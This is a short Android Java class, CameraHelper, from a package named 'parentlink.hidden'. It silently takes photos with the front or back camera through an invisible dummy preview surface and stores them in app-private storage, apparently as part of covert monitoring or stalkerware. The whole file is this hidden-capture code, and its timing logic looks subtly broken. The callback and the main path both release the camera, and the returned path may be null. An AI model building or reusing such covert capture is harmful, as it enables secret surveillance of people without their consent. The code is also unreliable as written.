package com.parentlink.hidden;

import android.content.Context;
import android.hardware.Camera;
import android.view.SurfaceView;
import android.view.SurfaceHolder;
import java.io.File;
import java.io.FileOutputStream;

public class CameraHelper {
    private Context context;
    private Camera camera;
    public static final int CAMERA_BACK = 0;
    public static final int CAMERA_FRONT = 1;
    
    public CameraHelper(Context context) {
        this.context = context;
    }
    
    public String captureBackCamera() {
        return capturePhoto(CAMERA_BACK);
    }
    
    public String captureFrontCamera() {
        return capturePhoto(CAMERA_FRONT);
    }
    
    private String capturePhoto(int cameraType) {
        try {
            int cameraId = cameraType == CAMERA_FRONT ? 
                Camera.getNumberOfCameras() - 1 : 0;
            camera = Camera.open(cameraId);
            if (camera == null) return null;
            
            Camera.Parameters params = camera.getParameters();
            params.setJpegQuality(90);
            camera.setParameters(params);
            
            SurfaceView dummyView = new SurfaceView(context);
            SurfaceHolder dummyHolder = dummyView.getHolder();
            camera.setPreviewDisplay(dummyHolder);
            camera.startPreview();
            
            final String[] imagePath = {null};
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    try {
                        String filename = "camera_" + System.currentTimeMillis() + ".jpg";
                        File imageFile = new File(context.getFilesDir(), filename);
                        FileOutputStream fos = new FileOutputStream(imageFile);
                        fos.write(data);
                        fos.close();
                        imagePath[0] = imageFile.getAbsolutePath();
                        cam.stopPreview();
                        cam.release();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            
            Thread.sleep(1000);
            if (camera != null) {
                camera.release();
                camera = null;
            }
            return imagePath[0];
        } catch (Exception e) {
            e.printStackTrace();
            if (camera != null) {
                camera.release();
                camera = null;
            }
            return null;
        }
    }
}